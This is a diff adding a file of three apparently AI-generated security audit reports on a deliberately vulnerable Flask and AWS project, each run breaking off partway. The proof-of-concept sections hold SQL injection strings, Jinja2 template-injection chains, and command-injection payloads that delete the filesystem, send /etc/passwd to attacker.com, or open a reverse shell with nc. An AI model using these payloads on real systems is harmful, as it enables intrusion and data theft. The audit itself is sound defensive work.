@@ -1,0 +1,2117 @@
+=== RUN 1 ===
+# Security Audit Report
+
+## Executive Summary
+
+This codebase contains **multiple critical and high-severity vulnerabilities** spanning all five OWASP categories under review. The application should not be deployed to production in its current state. Below is a comprehensive breakdown of every identified vulnerability.
+
+---
+
+## CRITICAL Vulnerabilities
+
+### VULN-001: SQL Injection via String Concatenation
+- **File:** `./app/routes/auth.py`, lines 40–43
+- **OWASP:** A03 – Injection | **CWE:** CWE-89 (SQL Injection)
+- **Severity:** 🔴 CRITICAL
+
+**Vulnerable Code:**
+```python
+query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+result = db.session.execute(query)
+```
+
+**Technical Explanation:**
+User-controlled input (`username`, `password`) is concatenated directly into a raw SQL string. An attacker can supply a payload such as `' OR '1'='1' --` as the username to bypass authentication entirely, or use `'; DROP TABLE users; --` to destroy data. This is a textbook SQL injection vulnerability with no sanitisation or parameterisation whatsoever.
+
+**Proof-of-Concept Attack:**
+```
+username: admin' --
+password: anything
+→ Executes: SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
+→ Logs in as admin with no valid password
+```
+
+**Remediation:**
+```python
+# Use SQLAlchemy ORM (already available in the project)
+from app.models import User
+
+@auth_bp.route("/login", methods=["POST"])
+def login():
+    data = request.get_json()
+    username = data.get("username")
+    password = data.get("password")
+
+    # Parameterised query via ORM
+    user = User.query.filter_by(username=username).first()
+    if user and check_password_hash(user.password, password):
+        token = generate_token(user.id)
+        return jsonify({"message": "Login successful", "token": token}), 200
+    return jsonify({"error": "Invalid credentials"}), 401
+```
+
+---
+
+### VULN-002: OS Command Injection via `subprocess.run` with `shell=True`
+- **File:** `./app/routes/files.py`, lines 24–30
+- **OWASP:** A03 – Injection | **CWE:** CWE-78 (OS Command Injection)
+- **Severity:** 🔴 CRITICAL
+
+**Vulnerable Code:**
+```python
+result = subprocess.run(
+    "file " + filename,
+    shell=True,
+    capture_output=True,
+    text=True
+)
+```
+
+**Technical Explanation:**
+The `filename` parameter is taken directly from user-supplied JSON and concatenated into a shell command string. With `shell=True`, the OS shell interprets the entire string, allowing an attacker to inject arbitrary shell commands using metacharacters (`;`, `&&`, `|`, `` ` ``, `$(...)`).
+
+**Proof-of-Concept Attack:**
+```
+filename: "test.txt; rm -rf / --no-preserve-root"
+filename: "test.txt && curl http://attacker.com/exfil?data=$(cat /etc/passwd)"
+filename: "test.txt | nc attacker.com 4444 -e /bin/bash"
+```
+
+**Remediation:**
+```python
+import shlex
+
+@files_bp.route("/process", methods=["POST"])
+def process_file():
+    data = request.get_json()
+    filename = data.get("filename")
+
+    # Validate filename against allowlist
+    if not re.match(r'^[\w\-. ]+$', filename):
+        return jsonify({"error": "Invalid filename"}), 400
+
+    # Pass as list (no shell interpolation), shell=False (default)
+    result = subprocess.run(
+        ["file", filename],          # List form prevents shell injection
+        shell=False,                 # Never use shell=True with user input
+        capture_output=True,
+        text=True,
+        timeout=10                   # Prevent hanging processes
+    )
+    return jsonify({"filename": filename, "output": result.stdout}), 200
+```
+
+---
+
+### VULN-003: Server-Side Template Injection (SSTI)
+- **File:** `./app/routes/templates.py`, lines 13–19
+- **OWASP:** A03 – Injection | **CWE:** CWE-94 (Code Injection)
+- **Severity:** 🔴 CRITICAL
+
+**Vulnerable Code:**
+```python
+env = Environment()
+template = env.from_string(template_str)
+rendered = template.render(**context)
+```
+
+**Technical Explanation:**
+A raw Jinja2 `Environment()` is created with no sandboxing, and user-supplied template strings are rendered directly. Jinja2 templates have access to Python's object model, allowing an attacker to traverse the MRO (Method Resolution Order) to reach dangerous built-ins and execute arbitrary code on the server.
+
+**Proof-of-Concept Attack:**
+```
+POST /templates/render
+{
+  "template": "{{ ''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate()[0].strip() }}",
+  "context": {}
+}
+→ Returns output of `id` command (or any arbitrary OS command)
+```
+
+**Remediation:**
+```python
+from jinja2.sandbox import SandboxedEnvironment
+
+@templates_bp.route("/render", methods=["POST"])
+def render_template_custom():
+    data = request.get_json()
+    template_str = data.get("template")
+    context = data.get("context", {})
+
+    # Validate context keys to prevent prototype pollution
+    allowed_keys = re.compile(r'^[a-zA-Z_][a-zA-Z0-9_]*$')
+    if not all(allowed_keys.match(k) for k in context.keys()):
+        return jsonify({"error": "Invalid context keys"}), 400
+
+    # Use SandboxedEnvironment to restrict template capabilities
+    env = SandboxedEnvironment()
+    try:
+        template = env.from_string(template_str)
+        rendered = template.render(**context)
+    except Exception as e:
+        return jsonify({"error": "Template rendering failed"}), 400
+
+    return jsonify({"rendered": rendered}), 200
+```
+
+> **Note:** Even `SandboxedEnvironment` has had historical bypasses. Consider whether user-defined template rendering is a necessary feature at all. If not, remove the endpoint entirely.
+
+---
+
+### VULN-004: Passwords Stored in Plaintext
+- **File:** `./app/routes/auth.py`, lines 30–35 | `./app/models.py`, line 9
+- **OWASP:** A02 – Cryptographic Failures | **CWE:** CWE-256 (Plaintext Storage of Password)
+- **Severity:** 🔴 CRITICAL
+
+**Vulnerable Code:**
+```python
+# auth.py - password stored as-is
+user = User(username=username, password=password, email=email)
+
+# models.py - no hashing indicated
+password = db.Column(db.String(120), nullable=False)
+```
+
+**Technical Explanation:**
+Passwords are stored in the database without any hashing or salting. If the database is compromised (via SQL injection, backup exposure, etc.), all user passwords are immediately exposed in plaintext. The `String(120)` column length is also too short for bcrypt hashes (which are 60 characters) but indicates no hashing is applied.
+
+**Remediation:**
+```python
+# Install: pip install Flask-Bcrypt
+from flask_bcrypt import Bcrypt
+bcrypt = Bcrypt()
+
+# In register():
+hashed_password = bcrypt.generate_password_hash(password).decode('utf-8')
+user = User(username=username, password=hashed_password, email=email)
+
+# In login():
+user = User.query.filter_by(username=username).first()
+if user and bcrypt.check_password_hash(user.password, password):
+    token = generate_token(user.id)
+    ...
+
+# In models.py - increase column size for hash storage:
+password = db.Column(db.String(255), nullable=False)
+```
+
+---
+
+## HIGH Vulnerabilities
+
+### VULN-005: Hardcoded Secret Keys and Credentials
+- **File:** `./app/config.py` (line 3), `./app/routes/auth.py` (lines 14, 18)
+- **OWASP:** A02 – Cryptographic Failures | **CWE:** CWE-798 (Hard-coded Credentials)
+- **Severity:** 🟠 HIGH
+
+**Vulnerable Code:**
+```python
+# config.py
+SECRET_KEY = "hardcoded-secret-key-123"
+
+# auth.py
+db_password = "supersecretdbpassword123"
+secret = "jwt-secret-key-hardcoded-2024"
+```
+
+**Technical Explanation:**
+Three separate secrets are hardcoded in source code. Anyone with read access to the repository (including via version control history) can extract these values. The Flask `SECRET_KEY` protects session cookies; the JWT secret protects authentication tokens. Compromise of either allows session forgery or token fabrication.
+
+**Remediation:**
+```python
+# config.py
+import os
+from dotenv import load_dotenv
+
+load_dotenv()
+
+class Config:
+    SECRET_KEY = os.environ.get("SECRET_KEY")
+    if not SECRET_KEY:
+        raise RuntimeError("SECRET_KEY environment variable is not set")
+    
+    SQLALCHEMY_DATABASE_URI = os.environ.get(
+        "DATABASE_URL", 
+        "sqlite:///dissertation.db"
+    )
+    SQLALCHEMY_TRACK_MODIFICATIONS = False
+
+# auth.py
+def generate_token(user_id):
+    secret = os.environ.get("JWT_SECRET_KEY")
+    if not secret:
+        raise RuntimeError("JWT_SECRET_KEY not configured")
+    ...
+```
+
+```bash
+# .env file (add to .gitignore immediately)
+SECRET_KEY=<generated-with-secrets.token_hex(32)>
+JWT_SECRET_KEY=<generated-with-secrets.token_hex(32)>
+DATABASE_URL=postgresql://user:pass@host/db
+```
+
+---
+
+### VULN-006: Overly Permissive IAM Policy – Wildcard Administrator Access
+- **File:** `./infrastructure/iam-policy.json`, lines 4–9
+- **OWASP:** A01 – Broken Access Control | **CWE:** CWE-732 (Incorrect Permission Assignment)
+- **Severity:** 🟠 HIGH
+
+**Vulnerable Code:**
+```json
+{
+    "Sid": "AdministratorAccess",
+    "Effect": "Allow",
+    "Action": "*",
+    "Resource": "*"
+}
+```
+
+**Technical Explanation:**
+This statement grants unrestricted access to every AWS service and every resource in the account. This violates the principle of least privilege entirely. If the credentials associated with this policy are compromised, an attacker has full control of the AWS account including the ability to create backdoor IAM users, exfiltrate all data, destroy infrastructure, and incur unlimited costs.
+
+**Remediation:**
+```json
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Sid": "AllowEC2Describe",
+            "Effect": "Allow",
+            "Action": [
+                "ec2:DescribeInstances",
+                "ec2:DescribeSecurityGroups",
+                "ec2:DescribeVpcs"
+            ],
+            "Resource": "*"
+        },
+        {
+            "Sid": "AllowS3ReadAccess",
+            "Effect": "Allow",
+            "Action": [
+                "s3:GetObject",
+                "s3:ListBucket"
+            ],
+            "Resource": [
+                "arn:aws:s3:::dissertation-bucket",
+                "arn:aws:s3:::dissertation-bucket/*"
+            ]
+        },
+        {
+            "Sid": "SecretsManagerReadOnly",
+            "Effect": "Allow",
+            "Action": [
+                "secretsmanager:GetSecretValue"
+            ],
+            "Resource": "arn:aws:secretsmanager:eu-west-2:ACCOUNT_ID:secret:dissertation/*"
+        }
+    ]
+}
+```
+
+---
+
+### VULN-007: Overly Permissive SecretsManager Policy
+- **File:** `./infrastructure/iam-policy.json`, lines 28–36
+- **OWASP:** A01 – Broken Access Control | **CWE:** CWE-732
+- **Severity:** 🟠 HIGH
+
+**Vulnerable Code:**
+```json
+{
+    "Sid": "SecretsManagerAccess",
+    "Effect": "Allow",
+    "Action": [
+        "secretsmanager:GetSecretValue",
+        "secretsmanager:ListSecrets",
+        "secretsmanager:DeleteSecret"
+    ],
+    "Resource": "*"
+}
+```
+
+**Technical Explanation:**
+`DeleteSecret` on `Resource: "*"` allows deletion of any secret in the account — a destructive capability that should never be granted broadly. `ListSecrets` on `*` exposes the names and metadata of all secrets. These permissions should be scoped to specific secret ARNs and `DeleteSecret` should be removed unless explicitly required.
+
+**Remediation:** See VULN-006 remediation above — scope to specific ARNs and remove `DeleteSecret` and `ListSecrets`.
+
+---
+
+### VULN-008: S3 Bucket with All Public Access Controls Disabled
+- **File:** `./infrastructure/main.tf`, lines 19–27
+- **OWASP:** A05 – Security Misconfiguration | **CWE:** CWE-732
+- **Severity:** 🟠 HIGH
+
+**Vulnerable Code:**
+```hcl
+resource "aws_s3_bucket_public_access_block" "public_bucket_access" {
+  block_public_acls       = false
+  block_public_policy     = false
+  ignore_public_acls      = false
+  restrict_public_buckets = false
+}
+```
+
+**Technical Explanation:**
+All four S3 public access block settings are explicitly disabled, meaning the bucket can be made publicly accessible via ACLs or bucket policies. Any sensitive data uploaded to this bucket could be exposed to the internet.
+
+**Remediation:**
+```hcl
+resource "aws_s3_bucket_public_access_block" "public_bucket_access" {
+  bucket = aws_s3_bucket.public_bucket.id
+
+  block_public_acls       = true
+  block_public_policy     = true
+  ignore_public_acls      = true
+  restrict_public_buckets = true
+}
+```
+
+If public access is genuinely required (e.g., for static assets), use CloudFront as a distribution layer rather than making the S3 bucket directly public.
+
+---
+
+### VULN-009: S3 Bucket Without Encryption (`unencrypted_bucket`)
+- **File:** `./infrastructure/main.tf`, lines 29–31
+- **OWASP:** A05 – Security Misconfiguration | **CWE:** CWE-311 (Missing Encryption of Sensitive Data)
+- **Severity:** 🟠 HIGH
+
+**Vulnerable Code:**
+```hcl
+resource "aws_s3_bucket" "unencrypted_bucket" {
+  bucket = "dissertation-unencrypted-bucket"
+}
+# No aws_s3_bucket_server_side_encryption_configuration defined
+# No aws_s3_bucket_public_access_block defined
+```
+
+**Technical Explanation:**
+This bucket has no server-side encryption configured and no public access block resource associated with it. Data at rest is unencrypted, and the bucket's public accessibility is undefined (defaults may vary by AWS account settings).
+
+**Remediation:**
+```hcl
+resource "aws_s3_bucket_public_access_block" "unencrypted_bucket_access" {
+  bucket = aws_s3_bucket.unencrypted_bucket.id
+
+  block_public_acls       = true
+  block_public_policy     = true
+  ignore_public_acls      = true
+  restrict_public_buckets = true
+}
+
+resource "aws_s3_bucket_server_side_encryption_configuration" "unencrypted_bucket_encryption" {
+  bucket = aws_s3_bucket.unencrypted_bucket.id
+
+  rule {
+
+=== RUN 2 ===
+# Security Audit Report
+
+## Executive Summary
+
+This codebase contains **multiple critical and high-severity vulnerabilities** spanning all five OWASP categories under review. The application should not be deployed in its current state. Below is a comprehensive breakdown of every identified vulnerability.
+
+---
+
+## CRITICAL Vulnerabilities
+
+### VULN-001: SQL Injection via String Concatenation
+- **File:** `./app/routes/auth.py`, lines 37–39
+- **OWASP:** A03 – Injection | **CWE:** CWE-89 (SQL Injection)
+- **Severity:** 🔴 CRITICAL
+
+**Vulnerable Code:**
+```python
+query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+result = db.session.execute(query)
+```
+
+**Technical Explanation:**
+User-controlled input (`username`, `password`) is concatenated directly into a raw SQL string. An attacker can supply a payload such as `' OR '1'='1' --` as the username to bypass authentication entirely, or use `'; DROP TABLE users; --` to destroy data. This is a textbook SQL injection vulnerability with no mitigating controls.
+
+**Proof-of-Concept Attack:**
+```
+username: admin' --
+password: anything
+→ Executes: SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
+→ Authenticates as admin with no password check
+```
+
+**Remediation:**
+```python
+# Use SQLAlchemy ORM (already available in the project)
+@auth_bp.route("/login", methods=["POST"])
+def login():
+    data = request.get_json()
+    username = data.get("username")
+    password = data.get("password")
+
+    # Use parameterized ORM query
+    user = User.query.filter_by(username=username).first()
+    if user and check_password_hash(user.password, password):
+        token = generate_token(user.id)
+        return jsonify({"message": "Login successful", "token": token}), 200
+    return jsonify({"error": "Invalid credentials"}), 401
+```
+
+---
+
+### VULN-002: OS Command Injection via `subprocess.run` with `shell=True`
+- **File:** `./app/routes/files.py`, lines 24–30
+- **OWASP:** A03 – Injection | **CWE:** CWE-78 (OS Command Injection)
+- **Severity:** 🔴 CRITICAL
+
+**Vulnerable Code:**
+```python
+result = subprocess.run(
+    "file " + filename,
+    shell=True,
+    capture_output=True,
+    text=True
+)
+```
+
+**Technical Explanation:**
+The `filename` parameter is taken directly from user-supplied JSON and concatenated into a shell command string. With `shell=True`, the OS shell interprets the entire string, allowing an attacker to inject arbitrary shell commands using metacharacters (`;`, `&&`, `|`, `` ` ``, `$(...)`).
+
+**Proof-of-Concept Attack:**
+```
+filename: "test.txt; curl http://attacker.com/exfil?data=$(cat /etc/passwd)"
+filename: "test.txt && rm -rf /"
+filename: "test.txt | nc attacker.com 4444 -e /bin/bash"
+```
+
+**Remediation:**
+```python
+import shlex
+
+@files_bp.route("/process", methods=["POST"])
+def process_file():
+    data = request.get_json()
+    filename = data.get("filename")
+
+    # Validate filename against allowlist
+    if not re.match(r'^[\w\-. ]+$', filename):
+        return jsonify({"error": "Invalid filename"}), 400
+
+    # Pass as list (never use shell=True with user input)
+    result = subprocess.run(
+        ["file", filename],   # List form prevents shell injection
+        shell=False,          # Explicitly False
+        capture_output=True,
+        text=True,
+        timeout=10            # Prevent hanging
+    )
+    return jsonify({"filename": filename, "output": result.stdout}), 200
+```
+
+---
+
+### VULN-003: Server-Side Template Injection (SSTI)
+- **File:** `./app/routes/templates.py`, lines 13–19
+- **OWASP:** A03 – Injection | **CWE:** CWE-94 (Code Injection)
+- **Severity:** 🔴 CRITICAL
+
+**Vulnerable Code:**
+```python
+env = Environment()
+template = env.from_string(template_str)
+rendered = template.render(**context)
+```
+
+**Technical Explanation:**
+A raw Jinja2 `Environment()` is instantiated with no sandbox restrictions, and user-supplied template strings are rendered directly. Jinja2 templates have access to Python's object model, allowing attackers to traverse class hierarchies to reach dangerous built-ins and execute arbitrary code on the server.
+
+**Proof-of-Concept Attack:**
+```
+POST /templates/render
+{
+  "template": "{{ ''.__class__.__mro__[1].__subclasses__()[396]('id', shell=True, stdout=-1).communicate()[0].decode() }}",
+  "context": {}
+}
+→ Executes arbitrary OS commands as the web server process
+```
+
+**Remediation:**
+```python
+from jinja2.sandbox import SandboxedEnvironment
+
+@templates_bp.route("/render", methods=["POST"])
+def render_template_custom():
+    data = request.get_json()
+    template_str = data.get("template")
+    context = data.get("context", {})
+
+    # Use SandboxedEnvironment to restrict access to Python internals
+    env = SandboxedEnvironment()
+    try:
+        template = env.from_string(template_str)
+        rendered = template.render(**context)
+    except Exception as e:
+        return jsonify({"error": "Template rendering failed"}), 400
+
+    return jsonify({"rendered": rendered}), 200
+```
+> ⚠️ **Note:** Even `SandboxedEnvironment` has had historical bypasses. Consider whether user-defined templates are a necessary feature. If not, use a predefined template library with variable substitution only.
+
+---
+
+## HIGH Vulnerabilities
+
+### VULN-004: Hardcoded Secret Key (Flask `SECRET_KEY`)
+- **File:** `./app/config.py`, line 3
+- **OWASP:** A02 – Cryptographic Failures | **CWE:** CWE-798 (Hard-coded Credentials)
+- **Severity:** 🟠 HIGH
+
+**Vulnerable Code:**
+```python
+SECRET_KEY = "hardcoded-secret-key-123"
+```
+
+**Technical Explanation:**
+Flask's `SECRET_KEY` is used to cryptographically sign session cookies. A known/weak secret key allows an attacker to forge valid session cookies, impersonating any user including administrators. The key is also committed to source control, making it permanently compromised.
+
+**Remediation:**
+```python
+# app/config.py
+import os
+
+class Config:
+    SECRET_KEY = os.environ.get("FLASK_SECRET_KEY")
+    if not SECRET_KEY:
+        raise ValueError("FLASK_SECRET_KEY environment variable is not set")
+    SQLALCHEMY_DATABASE_URI = os.environ.get("DATABASE_URL", "sqlite:///dissertation.db")
+    SQLALCHEMY_TRACK_MODIFICATIONS = False
+```
+```bash
+# Generate a strong key
+python -c "import secrets; print(secrets.token_hex(32))"
+# Store in environment or secrets manager, never in code
+export FLASK_SECRET_KEY="<generated_value>"
+```
+
+---
+
+### VULN-005: Hardcoded JWT Secret Key
+- **File:** `./app/routes/auth.py`, line 18
+- **OWASP:** A02 – Cryptographic Failures | **CWE:** CWE-798 (Hard-coded Credentials)
+- **Severity:** 🟠 HIGH
+
+**Vulnerable Code:**
+```python
+def generate_token(user_id):
+    secret = "jwt-secret-key-hardcoded-2024"
+```
+
+**Technical Explanation:**
+The JWT signing secret is hardcoded and weak. An attacker who knows this secret (e.g., via source code access, repository leak) can forge valid JWT tokens for any `user_id`, including administrative accounts, completely bypassing authentication.
+
+**Remediation:**
+```python
+import os
+
+def generate_token(user_id):
+    secret = os.environ.get("JWT_SECRET_KEY")
+    if not secret:
+        raise RuntimeError("JWT_SECRET_KEY is not configured")
+    payload = {
+        "user_id": user_id,
+        "iat": datetime.datetime.utcnow(),
+        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)  # Reduce from 24h
+    }
+    return jwt.encode(payload, secret, algorithm="HS256")
+```
+
+---
+
+### VULN-006: Hardcoded Database Password
+- **File:** `./app/routes/auth.py`, lines 13–15
+- **OWASP:** A02 – Cryptographic Failures | **CWE:** CWE-798 (Hard-coded Credentials)
+- **Severity:** 🟠 HIGH
+
+**Vulnerable Code:**
+```python
+def get_db_connection():
+    db_password = "supersecretdbpassword123"
+    return db_password
+```
+
+**Technical Explanation:**
+A database password is hardcoded in source code. Even though this function appears unused currently, its presence in the codebase means the credential is exposed to anyone with repository access and will persist in git history indefinitely.
+
+**Remediation:**
+```python
+# Remove this function entirely. If needed:
+def get_db_connection():
+    db_password = os.environ.get("DB_PASSWORD")
+    if not db_password:
+        raise RuntimeError("DB_PASSWORD environment variable not set")
+    return db_password
+```
+> Additionally, rotate the exposed password immediately and purge it from git history using `git filter-branch` or BFG Repo Cleaner.
+
+---
+
+### VULN-007: Passwords Stored in Plaintext
+- **File:** `./app/routes/auth.py`, lines 30–33 | `./app/models.py`, line 9
+- **OWASP:** A02 – Cryptographic Failures | **CWE:** CWE-256 (Plaintext Storage of Password)
+- **Severity:** 🟠 HIGH
+
+**Vulnerable Code:**
+```python
+# auth.py - registration
+user = User(username=username, password=password, email=email)
+
+# models.py - storage column
+password = db.Column(db.String(120), nullable=False)
+```
+
+**Technical Explanation:**
+Passwords are stored as plaintext in the database. A database breach, SQL injection attack, or insider threat immediately exposes all user passwords. The `String(120)` column length is also insufficient for proper bcrypt hashes (which are 60 characters, but the column should accommodate future algorithm changes).
+
+**Remediation:**
+```python
+# Install: pip install Flask-Bcrypt
+from flask_bcrypt import Bcrypt
+bcrypt = Bcrypt()
+
+# Registration
+hashed_password = bcrypt.generate_password_hash(password).decode("utf-8")
+user = User(username=username, password=hashed_password, email=email)
+
+# Login verification
+if user and bcrypt.check_password_hash(user.password, password):
+    token = generate_token(user.id)
+    ...
+
+# models.py - increase column size
+password = db.Column(db.String(255), nullable=False)
+```
+
+---
+
+### VULN-008: Overly Permissive IAM Policy – Wildcard Administrator Access
+- **File:** `./infrastructure/iam-policy.json`, lines 4–9
+- **OWASP:** A01 – Broken Access Control | **CWE:** CWE-732 (Incorrect Permission Assignment)
+- **Severity:** 🟠 HIGH
+
+**Vulnerable Code:**
+```json
+{
+    "Sid": "AdministratorAccess",
+    "Effect": "Allow",
+    "Action": "*",
+    "Resource": "*"
+}
+```
+
+**Technical Explanation:**
+This statement grants unrestricted access to every AWS service and every resource in the account. This violates the principle of least privilege. If the credentials associated with this policy are compromised, an attacker gains full control of the AWS account — including the ability to create backdoor IAM users, exfiltrate all data, and incur unlimited costs.
+
+**Remediation:**
+```json
+// Remove the AdministratorAccess statement entirely.
+// Grant only the specific permissions required by the application.
+// Example for a web application:
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Sid": "AllowEC2Describe",
+            "Effect": "Allow",
+            "Action": [
+                "ec2:DescribeInstances",
+                "ec2:DescribeSecurityGroups",
+                "ec2:DescribeVpcs"
+            ],
+            "Resource": "*"
+        },
+        {
+            "Sid": "AllowS3ReadAccess",
+            "Effect": "Allow",
+            "Action": [
+                "s3:GetObject",
+                "s3:ListBucket"
+            ],
+            "Resource": "arn:aws:s3:::dissertation-bucket/*"
+        }
+    ]
+}
+```
+
+---
+
+### VULN-009: Debug Mode Enabled in Production Entry Point
+- **File:** `./run.py`, line 5
+- **OWASP:** A05 – Security Misconfiguration | **CWE:** CWE-94 / CWE-215
+- **Severity:** 🟠 HIGH
+
+**Vulnerable Code:**
+```python
+app.run(debug=True)
+```
+
+**Technical Explanation:**
+Flask's debug mode enables the Werkzeug interactive debugger, which provides a Python REPL in the browser when an exception occurs. This REPL allows arbitrary Python code execution on the server. Debug mode also enables auto-reloading and exposes detailed stack traces to end users.
+
+**Remediation:**
+```python
+# run.py
+from app import create_app
+import os
+
+app = create_app()
+
+if __name__ == "__main__":
+    debug = os.environ.get("FLASK_DEBUG", "false").lower() == "true"
+    app.run(debug=debug)
+
+# Better: use a production WSGI server (gunicorn/uWSGI) instead of Flask's dev server
+# gunicorn -w 4 -b 0.0.0.0:8000 run:app
+```
+
+---
+
+## MEDIUM Vulnerabilities
+
+### VULN-010: S3 Bucket with All Public Access Controls Disabled
+- **File:** `./infrastructure/main.tf`, lines 20–27
+- **OWASP:** A05 – Security Misconfiguration | **CWE:** CWE-732
+- **Severity:** 🟡 MEDIUM
+
+**Vulnerable Code:**
+```hcl
+resource "aws_s3_bucket_public_access_block" "public_bucket_access" {
+  block_public_acls       = false
+  block_public_policy     = false
+  ignore_public_acls      = false
+  restrict_public_buckets = false
+}
+```
+
+**Technical Explanation:**
+All four S3 public access block settings are disabled, meaning the bucket can be made publicly accessible via ACLs or bucket policies. Unless this bucket is intentionally serving public static content, this exposes potentially sensitive data to the internet.
+
+**Remediation:**
+```hcl
+resource "aws_s3_bucket_public_access_block" "public_bucket_access" {
+  bucket = aws_s3_bucket.public_bucket.id
+
+  block_public_acls       = true
+  block_public_policy     = true
+  ignore_public_acls      = true
+  restrict_public_buckets = true
+}
+
+# If public access is required, use CloudFront as a CDN layer
+# and restrict S3 access to CloudFront via Origin Access Control (OAC)
+```
+
+---
+
+### VULN-011: S3 Bucket Without Server-Side Encryption
+- **File:** `./infrastructure/main.tf`, lines 30–32
+- **OWASP:** A02 – Cryptographic Failures | **CWE:** CWE-311 (Missing Encryption of Sensitive Data)
+- **Severity:** 🟡 MEDIUM
+
+**Vulnerable Code:**
+```hcl
+resource "aws_s3_bucket" "unencrypted_bucket" {
+  bucket = "dissertation-un
+
+=== RUN 3 ===
+# Security Audit Report
+
+## Executive Summary
+
+This codebase contains **multiple critical and high-severity vulnerabilities** spanning all five OWASP categories under review. The application should not be deployed to production in its current state.
+
+---
+
+## VULNERABILITY 1: SQL Injection
+
+**File:** `./app/routes/auth.py`, lines 37–39  
+**CWE:** CWE-89 — Improper Neutralization of Special Elements used in SQL Command  
+**OWASP:** A03:2021 — Injection  
+**Severity:** 🔴 CRITICAL
+
+### Vulnerable Code
+```python
+query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
+result = db.session.execute(query)
+```
+
+### Technical Explanation
+User-supplied input (`username` and `password`) is concatenated directly into a raw SQL string with no sanitisation or parameterisation. An attacker can supply a username such as `' OR '1'='1' --` to bypass authentication entirely, or use `'; DROP TABLE users; --` to destroy data. Because the raw string is passed to `db.session.execute()`, the database engine interprets the injected SQL as legitimate commands.
+
+### Remediation
+```python
+from sqlalchemy import text
+
+@auth_bp.route("/login", methods=["POST"])
+def login():
+    data = request.get_json()
+    username = data.get("username")
+    password = data.get("password")
+
+    # Use parameterised query — never string-concatenate user input
+    query = text("SELECT * FROM users WHERE username = :username AND password = :password")
+    result = db.session.execute(query, {"username": username, "password": password})
+    user = result.fetchone()
+
+    if user:
+        token = generate_token(user[0])
+        return jsonify({"message": "Login successful", "token": token}), 200
+    return jsonify({"error": "Invalid credentials"}), 401
+```
+
+> **Additional note:** Passwords must be hashed (see Vulnerability 5). Comparing plaintext passwords in SQL is itself a critical flaw.
+
+---
+
+## VULNERABILITY 2: OS Command Injection
+
+**File:** `./app/routes/files.py`, lines 22–29  
+**CWE:** CWE-78 — Improper Neutralisation of Special Elements used in an OS Command  
+**OWASP:** A03:2021 — Injection  
+**Severity:** 🔴 CRITICAL
+
+### Vulnerable Code
+```python
+result = subprocess.run(
+    "file " + filename,   # ← unsanitised user input
+    shell=True,           # ← shell=True makes this exploitable
+    capture_output=True,
+    text=True
+)
+```
+
+### Technical Explanation
+`filename` comes directly from user-supplied JSON. With `shell=True`, the entire string is passed to `/bin/sh -c`. An attacker can supply `; cat /etc/passwd` or `$(curl attacker.com/shell.sh | bash)` as the filename, achieving arbitrary remote code execution on the host.
+
+### Remediation
+```python
+import shlex
+
+@files_bp.route("/process", methods=["POST"])
+def process_file():
+    data = request.get_json()
+    filename = data.get("filename", "")
+
+    # 1. Validate filename — allow only safe characters
+    if not re.match(r'^[\w\-. ]+$', filename):
+        return jsonify({"error": "Invalid filename"}), 400
+
+    # 2. Pass arguments as a list; never use shell=True with user input
+    result = subprocess.run(
+        ["file", filename],   # list form bypasses shell interpretation
+        shell=False,          # explicit — never True with user data
+        capture_output=True,
+        text=True,
+        timeout=10
+    )
+
+    return jsonify({
+        "filename": filename,
+        "output": result.stdout,
+        "error": result.stderr
+    }), 200
+```
+
+---
+
+## VULNERABILITY 3: Server-Side Template Injection (SSTI)
+
+**File:** `./app/routes/templates.py`, lines 13–20  
+**CWE:** CWE-94 — Improper Control of Generation of Code ('Code Injection')  
+**OWASP:** A03:2021 — Injection  
+**Severity:** 🔴 CRITICAL
+
+### Vulnerable Code
+```python
+env = Environment()                        # no sandboxing
+template = env.from_string(template_str)  # raw user input as template
+rendered = template.render(**context)
+```
+
+### Technical Explanation
+A Jinja2 `Environment()` created without a sandbox gives the template full access to Python's object model. An attacker can send:
+```
+{{ ''.__class__.__mro__[1].__subclasses__() }}
+```
+to enumerate classes, and then:
+```
+{{ ''.__class__.__mro__[1].__subclasses__()[<n>].__init__.__globals__['os'].popen('id').read() }}
+```
+to achieve **remote code execution**. This is a well-documented Jinja2 SSTI attack chain.
+
+### Remediation
+```python
+from jinja2.sandbox import SandboxedEnvironment
+
+@templates_bp.route("/render", methods=["POST"])
+def render_template_custom():
+    data = request.get_json()
+    template_str = data.get("template", "")
+    context = data.get("context", {})
+
+    # Whitelist allowed context keys to prevent namespace pollution
+    allowed_keys = {"name", "title", "body"}  # define per your use case
+    safe_context = {k: v for k, v in context.items() if k in allowed_keys}
+
+    # SandboxedEnvironment restricts access to dangerous attributes
+    env = SandboxedEnvironment()
+    try:
+        template = env.from_string(template_str)
+        rendered = template.render(**safe_context)
+    except Exception:
+        return jsonify({"error": "Template rendering failed"}), 400
+
+    return jsonify({"rendered": rendered}), 200
+```
+
+> **Architectural recommendation:** Avoid rendering user-supplied templates entirely. Use a predefined template library with variable substitution only.
+
+---
+
+## VULNERABILITY 4: Hardcoded Secrets and Credentials
+
+**Files:**  
+- `./app/config.py`, line 3  
+- `./app/routes/auth.py`, lines 14 and 20  
+
+**CWE:** CWE-798 — Use of Hard-coded Credentials  
+**OWASP:** A02:2021 — Cryptographic Failures / A05:2021 — Security Misconfiguration  
+**Severity:** 🔴 CRITICAL
+
+### Vulnerable Code
+```python
+# app/config.py
+SECRET_KEY = "hardcoded-secret-key-123"
+
+# app/routes/auth.py
+db_password = "supersecretdbpassword123"   # line 14
+secret = "jwt-secret-key-hardcoded-2024"   # line 20
+```
+
+### Technical Explanation
+Hardcoded secrets committed to source control are permanently exposed to anyone with repository access — including historical access via `git log`. The weak Flask `SECRET_KEY` allows session forgery. The hardcoded JWT secret allows an attacker to forge valid tokens for any `user_id`, including administrators. The database password is exposed in plaintext.
+
+### Remediation
+```python
+# app/config.py
+import os
+
+class Config:
+    SECRET_KEY = os.environ["FLASK_SECRET_KEY"]          # raises if unset — intentional
+    SQLALCHEMY_DATABASE_URI = os.environ["DATABASE_URL"]
+    SQLALCHEMY_TRACK_MODIFICATIONS = False
+
+# app/routes/auth.py
+def generate_token(user_id):
+    secret = os.environ["JWT_SECRET_KEY"]                # load from environment
+    payload = {
